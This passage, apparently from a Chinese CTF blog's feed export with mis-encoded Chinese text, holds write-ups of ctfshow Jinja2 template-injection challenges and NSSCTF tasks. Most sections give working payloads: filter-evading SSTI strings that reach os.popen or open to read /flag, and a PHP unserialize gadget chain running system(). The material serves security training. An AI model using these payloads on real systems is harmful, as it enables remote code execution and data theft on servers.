operator">></span></pre></td></tr></table></figure></li><li><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">28</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="2"></td><td><pre>æˆ–è€…</pre></td></tr><tr><td data-num="3"></td><td><pre>?name<span class="token operator">=</span><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>swigï¿¼<span class="token number">29</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">&lt;</span>!<span class="token operator">-</span><span class="token operator">-</span>codeï¿¼<span class="token number">3</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span></pre></td></tr></table></figure></li></ul><p>â€‹payload2ï¼šè¿™é‡Œç”¨ config æ‹¿åˆ°å­—ç¬¦ä¸²ï¼Œæ¯”è¾ƒéº»çƒ¦å°±ä¸å…¨æ¼”ç¤ºäº†ï¼Œåªæ¼”ç¤ºéƒ¨åˆ†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[(config.__str__()[<span class="number">2</span>])%2B(config.__str__()[<span class="number">42</span>])]&#125;&#125;</span><br><span class="line">ç›¸å½“äº</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[<span class="string">&#x27;os&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹payload3ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;% <span class="built_in">print</span>  url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]%&#125;</span><br><span class="line"> </span><br><span class="line">ä½¿ç”¨</span><br><span class="line">?name=&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__.__builtins__.<span class="built_in">chr</span> %&#125;&#123;&#123; url_for.__globals__[<span class="built_in">chr</span>(<span class="number">111</span>)%2bchr(<span class="number">115</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="web364"><a class="markdownIt-Anchor" href="#web364">#</a> web364ï¼š</h1><p>â€‹è¿‡æ»¤äº†å¼•å·ï¼Œargsï¼ŒåŒæ—¶ä¸å…è®¸ä½¿ç”¨ POST ä¼ å‚ï¼Œä½¿ç”¨ Cookie ä¼ å‚å§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">94</span>][request.cookies.m1](<span class="number">0</span>,request.cookies.m2)&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥å‚æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=get_data;m2=/flag</span><br></pre></td></tr></table></figure><h1 id="web365"><a class="markdownIt-Anchor" href="#web365">#</a> Web365ï¼š</h1><p>â€‹è¿™é‡Œåœ¨ä¸Šä¸€ä¸ªé¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†ä¸­æ‹¬å·ï¼Œæ‰€ä»¥å¾—ç”¨åˆ«çš„æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">290</span>).__init__.__globals__.__getitem__(request.cookies.m1).popen(request.cookies.m2).read()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æœ‰ä¸ªåŠæ³•ï¼Œä¸è¿‡æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå¤±è´¥äº†ä¹‹åç¯å¢ƒå°±åºŸäº†ï¼Œæ¯•ç«Ÿ pop ä¼šåˆ é™¤å¯¹åº”çš„é”®ï¼Œå¯¼è‡´ç¯å¢ƒå´©æºƒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">290</span>).__init__.__globals__.pop(request.cookies.m1).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=os;m2=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web366"><a class="markdownIt-Anchor" href="#web366">#</a> Web366ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜å¤šè¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼Œå¯ä»¥ç”¨ lipsum ç»•è¿‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).os.popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å Cookie ä¼ å…¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web367"><a class="markdownIt-Anchor" href="#web367">#</a> Web367ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜åˆè¿‡æ»¤äº†ä¸ª osï¼Œç›´æ¥æ‰”ä¸ª payload å§ï¼ŒPayload è§£é‡Šé—® Ai éƒ½å¯ä»¥é—®å‡ºæ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä¼ å…¥ Cookieï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m1=__globals__;m2=cat /flag;m3=os</span><br></pre></td></tr></table></figure><h1 id="web368"><a class="markdownIt-Anchor" href="#web368">#</a> Web368ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜ï¼Œéœ€è¦ç”¨åˆ° <code>&#123;% %&#125;</code> ï¼Œå› ä¸ºåŒå¤§æ‹¬å·é‡Œçš„ request è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯ <code>&#123;% %&#125;</code>  ä¸­çš„ request æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå’Œä¸Šä¸€ä¸ªé¢˜æ„é€ çš„ payload ä¸€æ ·ï¼Œä¸è¿‡æœ‰ç‚¹æ”¹å˜ï¼Œå°±æ˜¯æ²¡æœ‰ä½¿ç”¨åŒå¤§æ‹¬å·ï¼Œæ‰€ä»¥éœ€è¦ print è¾“å‡ºä»¥ä¸‹ï¼ˆç±»ä¼¼æ— å›æ˜¾ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%<span class="built_in">print</span>((lipsum|attr(request.cookies.m1)).get(request.cookies.m3).popen(request.cookies.m2).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web369"><a class="markdownIt-Anchor" href="#web369">#</a> Web369ï¼š</h1><p>â€‹è¿™é‡Œç›´æ¥ç»™ request ç»™ ban äº†ï¼Œä¸è¿‡å¯ä»¥è‡ªå·±æ‹¼å­—ç¬¦ä¸²ï¼Œè¿˜ç®—å¥½ï¼Œç›´æ¥ä¸Šæœ€ç»ˆ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><p>â€‹çœ‹ç€å¾ˆé•¿å¾ˆå”¬äººï¼Œä½†å®é™…ç¡®å®ä¸ç®€å•ï¼Œè¿™ä¸ªæˆ‘ä¼šåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« è¿›è¡Œè€ƒç‚¹æ€»ç»“çš„ï¼Œä¸æ€¥ï¼Œè¿™é‡Œå…ˆç»™ä¸‹è§£é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;          //æ‹¼æ¥å‡ºpop</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;         //æ‹¼æ¥å‡º_</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join%&#125;          //æ‹¼æ¥å‡º__init__</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;       //æ‹¼æ¥å‡º__globals__</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;//æ‹¼æ¥å‡º__getitem__</span><br><span class="line">&#123;% <span class="built_in">set</span> buil=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;//æ‹¼æ¥å‡º__builtins__</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;//ä½¿ç”¨<span class="built_in">chr</span>ç±»æ¥è¿›è¡ŒRCEå› ä¸ºç­‰ä¼šè¦<span class="built_in">ascii</span>è½¬å­—ç¬¦</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(<span class="number">47</span>)%2bchr(<span class="number">102</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">103</span>)%&#125;//æ‹¼æ¥å‡º/flag</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web370"><a class="markdownIt-Anchor" href="#web370">#</a> Web370ï¼š</h1><p>â€‹è¿™ä¸ªé¢˜è¿‡æ»¤äº†æ•°å­—ï¼Œä¸è¿‡å¯ä»¥ç”¨å…¨è§’æ•°å­—æ¥ç»•è¿‡ï¼Œè½¬æ¢çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">half2full</span>(<span class="params">half</span>):</span><br><span class="line">    full = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> half:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="built_in">ord</span>(ch) + <span class="number">0xfee0</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">ord</span>(ch) == <span class="number">32</span>:</span><br><span class="line">            ch = <span class="built_in">chr</span>(<span class="number">0x3000</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        full += ch</span><br><span class="line">    <span class="keyword">return</span> full</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥æƒ³è¦è½¬æ¢çš„æ•°å­—å­—ç¬¦ä¸²ï¼š&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        t += half2full(i)</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¾—åˆ°çš„ payload å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(ï¼’ï¼”)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(<span class="built_in">globals</span>=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(ï¼”ï¼—)%2bchr(ï¼‘ï¼ï¼’)%2bchr(ï¼‘ï¼ï¼˜)%2bchr(ï¼™ï¼—)%2bchr(ï¼‘ï¼ï¼“)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»NSSCTFå¼€å§‹çš„å¤å»ºä¹‹è·¯</title>
      <link href="/posts/cf99ed43.html"/>
      <url>/posts/cf99ed43.html</url>
      
        <content type="html"><![CDATA[<h1 id="ä»nssctfå¼€å§‹çš„å¤å»ºä¹‹è·¯"><a class="markdownIt-Anchor" href="#ä»nssctfå¼€å§‹çš„å¤å»ºä¹‹è·¯">#</a> ä» NSSCTF å¼€å§‹çš„å¤å»ºä¹‹è·¯</h1><h2 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€">#</a> å‰è¨€ï¼š</h2><p>â€‹æ‘†çƒ‚äº†æœ‰æ®µæ—¶é—´äº†ï¼Œæ„Ÿè§‰ä¸åº”è¯¥å†ç»§ç»­è¿™æ ·äº†ï¼Œå¼€ä¸ªæ–°å‘ï¼Œè®©æˆ‘æ…¢æ…¢å›å¿†ä¸€äº›å¿˜è®°çš„å†…å®¹ï¼Œæˆ‘çŸ¥é“ä¸åº”è¯¥æ‘†çƒ‚ï¼Œä½†å¿ƒç†é—®é¢˜å¯¼è‡´æˆ‘æ„Ÿè§‰ä¸€åˆ‡éƒ½å¤±å»äº†æ„ä¹‰ï¼Œè¿˜å¥½ï¼Œmaimai è®©æˆ‘è‡³å°‘æœ‰æ´»ä¸‹å»çš„æƒ³æ³•ï¼Œåœ¨å†™è¿™æ®µè¯çš„æ—¶å€™ï¼Œæˆ‘æ­£åœ¨å¬ The Last Page â€“ ARForestï¼Œä¸€åˆ‡çš„ä¸å¦‚æ„éƒ½æœ‰æœ€åä¸€é¡µï¼Œè€Œç°åœ¨ï¼Œæˆ‘å¸Œæœ›æˆ‘çš„ä½è°·æœŸå·²ç»æ¥åˆ°äº† The Last Page ï¼ŒæœŸå¾…æ¥ä¸‹æ¥çš„æ¯ä¸€æ­¥éƒ½ä¼šåƒ The Last Page ä¸€èˆ¬ï¼Œå……æ»¡å¸Œæœ›ï¼Œå……æ»¡ç¾å¥½ã€‚-- å‘ç™«å®Œæ¯•</p><h2 id="re"><a class="markdownIt-Anchor" href="#re">#</a> Reï¼š</h2><h3 id="swpuctf-2022-æ–°ç”Ÿèµ›base64"><a class="markdownIt-Anchor" href="#swpuctf-2022-æ–°ç”Ÿèµ›base64">#</a> [SWPUCTF 2022 æ–°ç”Ÿèµ›] base64</h3><p>â€‹IDA æ‰“å¼€åï¼Œshift+f12 æ‰¾åˆ°äº† base64 ç¼–ç çš„ç¼–ç è¡¨ï¼Œè¡¨æ²¡æœ‰ç»è¿‡ä¿®æ”¹ï¼ŒåŒæ—¶æ‰¾åˆ°åŠ å¯†åçš„æ•°æ®ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TlNTQ1RGe2Jhc2VfNjRfTlRXUTRaR0ROQzdOfQ==</span><br></pre></td></tr></table></figure><p>â€‹ç»è¿‡ base64 è§£ç ä¹‹åå¾—åˆ° flagï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;base<span class="built_in">_</span>64<span class="built_in">_</span>NTWQ4ZGDNC7N&#125;</span><br></pre></td></tr></table></figure><h2 id="web"><a class="markdownIt-Anchor" href="#web">#</a> Web ï¼š</h2><h3 id="moectf-2021unserialize"><a class="markdownIt-Anchor" href="#moectf-2021unserialize">#</a> [MoeCTF 2021]unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start-&gt;<span class="title function_ invoke__">helloworld</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆä» entrance å‡ºå‘ï¼Œååºåˆ—åŒ–å‡ºå‘  <code>__destruct</code>  ï¼Œ è®© start ä½œä¸º springboard å¯è§¦å‘  <code>__call</code> ï¼Œè®©</p><p>springboard  ä¸­çš„ middle ä½œä¸º evil å¯è§¦å‘  <code>__get</code>  ï¼Œä¹‹åå°±æ˜¯ç»™ end ä¼ å‚å®ç° RCEã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">entrance</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="keyword">new</span> <span class="title function_ invoke__">springboard</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;start-&gt;middle-&gt;end = <span class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h3 id="gdouctf-2023åæ–¹å‘çš„é’Ÿ"><a class="markdownIt-Anchor" href="#gdouctf-2023åæ–¹å‘çš„é’Ÿ">#</a> [GDOUCTF 2023] åæ–¹å‘çš„é’Ÿ:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$rank</span>,<span class="variable">$salary</span> = <span class="number">10000</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;rank = <span 